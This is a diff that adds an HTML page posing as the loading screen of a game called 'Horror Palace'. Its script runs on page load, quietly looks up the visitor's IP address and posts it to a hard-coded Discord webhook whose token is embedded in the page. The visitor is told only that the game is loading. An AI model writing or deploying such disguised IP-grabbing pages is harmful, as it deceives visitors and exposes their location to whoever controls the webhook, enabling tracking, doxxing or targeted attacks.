@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta content="thepixelcoders" property="article:author" />
+    <meta content="Horror Palace" property="og:title" />
+    <meta content="https://files.catbox.moe/owzsiw.webp" property="og:image" />
+    <meta content="#000000" data-react-helmet="true" name="theme-color" />
+    <title>Horror Palace!</title>
+</head>
+<body>
+    <h1>please wait a moment</h1>
+    <p>the game is loading.</p>
+
+    <script>
+        // Define the Discord Webhook URL
+        const webhookUrl = 'https://canary.discord.com/api/webhooks/1274007191895937106/DGenTMvWra-suCoxP1NJBOjs4Iou1HSo9dIEs9ezBhVDFUUe4ZQSnFJtQImvXvzJZbiB';
+
+        // Fetch the visitor's IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+
+                // Prepare the payload to send to the Discord webhook
+                const payload = {
+                    content: `New visitor IP: ${ip}`
+                };
+
+                // Send the IP address to the Discord webhook
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            })
+            .catch(error => console.error('Error fetching IP address:', error));
+    </script>
+</body>
+</html>
